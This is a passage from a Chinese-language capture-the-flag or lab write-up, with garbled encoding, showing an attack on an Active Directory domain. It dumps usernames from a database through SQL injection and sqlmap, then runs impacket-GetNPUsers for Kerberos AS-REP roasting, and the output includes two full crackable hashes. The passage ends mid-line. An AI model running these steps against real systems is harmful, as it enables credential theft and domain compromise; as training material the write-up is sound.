1m36.67936002s\n~~~\n\n172.22.6.38æ˜¯ä¸€ä¸ªwebæœåŠ¡ ï¼Œç”¨ä¸‡èƒ½å¯†ç å¯ä»¥ç™»å½•æˆåŠŸå­˜åœ¨sqlæ³¨å…¥ï¼Œä½†æ˜¯ä¸ä¼šè·³è½¬ï¼Œç”¨sqlmapè·‘ä¸€ä¸‹\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time1.png)\n\nflag02åœ¨æ•°æ®åº“é‡Œï¼Œå°†oa_db.oa_usersçš„emailæå‡ºï¼Œå¤„ç†ä¸€ä¸‹å°†ç”¨æˆ·åæå–å‡ºæ¥\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# cat 1|grep -E '\\w*@' -o|grep -E '[^@]*' -o >username\n\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# cat username\nmengxiang\nmennane\nmenxilong\nmenxixiao\nmiaogui\nmiaoshu\nmingfu\nminglian\nmingsong\nmingyan\nmoqian\nmouchun\nmoushan\nmucheng\nmuchun\nmujie\nnangongjun\nniuya\nnongfan\nnongyan\nnongyan\nnongyao\nnongzhen\nnongzhu\noulun\npanbao\npangcheng\npangning\npangtai\npangzhen\npengyuan\npinghao\npuyangfu\nqiai\nqiangjun\nqianqing\nqianyi\nqianyou\nqiaode\nqiaomei\nqidiaofang\nqiguanrou\nqijie\nqinguan\nqiruo\nqiyan\nqiyong\nqiyuan\nqiyue\nqizhu\nqulu\nrangsibo\nranqun\nrongbiao\nrongxianyu\nruanyong\nrubao\nruibei\nruilin\nruishi\nruisong\nshangjie\nshangjun\nshangqian\nshanshao\nshaocai\nshaokang\nshaoting\nshaoyi\nshengzhe\nshenhang\nshenjiao\nshenshan\nshenshan\nshentuyun\nsheweiyue\nshie\nshijian\nshijun\nshilan\nshishu\nshouchun\nshoujuan\nshuangchen\nshudi\nshuicheng\nshuifei\nshushi\nshuzhen\nsisiwu\nsituxin\nsiyi\nsongming\nsongqin\nsongyan\nsunduangu\nsunli\nsunmei\nsunzhongda\ntaigongyuan\ntanggui\ntangqiao\ntangrong\ntangshun\ntaoya\ntianxin\ntongdong\ntonghao\ntongxue\nwangnuo\nwangxing\nwangyan\nwangyan\nwangying\nwansifei\nwansifu\nwansishun\nwanyan\nweicheng\nweichipeng\nweigong\nweihua\nweihui\nweiliang\nweishengshan\nweiwan\nweixian\nweixian\nweixue\nwenbiao\nwenbo\nwendong\nwengbang\nwengong\nwenliang\nwenshao\nwohong\nwohua\nwuce\nwuda\nwuhuan\nwulun\nwunuo\nxiahan\nxiai\nxiamao\nxiangdong\nxiangjuan\nxiangqian\nxiangxin\nxiangyu\nxiaojin\nxiaorong\nxiayu\nxieyi\nxijun\nximenshi\nxingquan\nxingxi\nxingye\nxionghong\nxiqi\nxiqidi\nxixia\nxiyao\nxiyi\nxuanjiang\nxuanlu\nxuanqun\nxudi\nxuehe\nxundi\nxupeng\nxuxin\nyangdanhan\nyangdanhe\nyangju\nyanglang\nyanguo\nyanji\nyanjin\nyanqian\nyanyangmei\nyanyue\nyanyun\nyanzhen\nyetai\nyexing\nyezongyue\nyifu\nyinbin\nyinchen\nyingbiao\nyingchan\nyingjun\nyingpeng\nyingshi\nyinyu\nyixue\nyouchao\nyouyi\nyuanchang\nyubo\nyufen\nyuhui\nyuhui\nyujian\nyujun\nyuling\nyulvxue\nyunhui\nyunqian\nyunzhong\nyurui\nyusha\nyuwan\nyuxi\nyuxiao\nzangpeng\nzangyao\nzhangxin\nzhangzhao\nzhannan\nzhaoxiu\nzhenglu\nzhengpubei\nzhengxiao\nzhenhui\nzhenjun\nzhenyan\nzhongliying\nzhouchun\nzhoujing\nzhoujun\nzhouqi\nzhouya\nzhouyi\nzhuangsong\nzhubin\nzhufeng\nzhuke\nzhuli\nzhupeng\nzhupeng\nzhuqin\nzhuzhu\nzizhuansong\nzizhuanyu\nzizhuanzhi\nzoubao\nzoufu\nzouqi\nzuofen\nzuoqiufa\nzuoqiutai\nzuoshun\n~~~\n\nç„¶åå¯¹åŸŸæ§è¿›è¡Œ**Kerberos AS-REP Roasting** æ”»å‡»\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# impacket-GetNPUsers xiaorang.lab/ -dc-ip 172.22.6.12 -usersfile username -format hashcat\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies\n\n/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).\n  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User pangzhen doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User pengyuan doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User qiaomei doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User qiyue doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User rangsibo doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User rubao doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User sheweiyue doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User shuzhen doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User tangrong doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User tangshun doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User weicheng doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User weishengshan doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User weixian doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User weixian doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User wenbiao doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User wenbo doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User wengbang doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User wenliang doesn't have UF_DONT_REQUIRE_PREAUTH set\n$krb5asrep$23$wenshao@XIAORANG.LAB:fde3340835efa9c8cb0330ae567c5c46$8228d9ae7bbd8e0ddcb991f14dfdd653bf2f05bd78effb9f48aa1095c7f4ee832254961a1d17de3e3e6cfd76c4048774b1c30bf45220d6f4f7dd6d958395dff97b733372d3562060209baa7ae25ca86734be598b1e7e42678d9bfacf14676b5d4f51b268a780b4dd6da66b2518dcf4888d658ea8ade7a35a40a9d6965bb304995498bf1cdcea67431d870c9e69982bcb25037fa8f8dc16695e0ecce65333e6f88231016fdc6312adf0d77749b63f85d05d1437d9a4290520de6272d3c0a636b4baf8ed7de278fcb5106503e57e35df5adbb9dd46503a58c0655e538ea24774f2c08234f6905e3120da8fc3fa\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User wohua doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User xiqidi doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User xiyi doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User xuanjiang doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User yangju doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User yanglang doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User yexing doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User yifu doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User yuanchang doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User yulvxue doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n$krb5asrep$23$zhangxin@XIAORANG.LAB:7aa36d3b1959318ccfe126e76624e4ea$c73a0aae1f17c00a07e9475d06964867c0adbbc19cdce676cc50a36aa3a12531021ef9e28202b027ae19fd538350edbe77d9dcf68ce187a2bf20ea2d559b478d12b7a9b4663f35611b8306da742d770ebbfe376e3e0af67aefe160e5ab422b219b4895f86e2735d536ed4ac7de07fd6400f9f8ca821c21c42325e4ce3e08ed70644dc44f62495853e169b4954624ef0fa2e1be73b336a276a35d4a32f6f4194e85498bb8c9412caeeb520d8fbca27bea8d3c694950bd019217683d429f727d95adefddf103790450a27e2fd750e8e220984f3bae37b95d582127861d2c62ab13e7c55512274df513b95043d0\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User zhaoxiu doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User zhenjun doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: 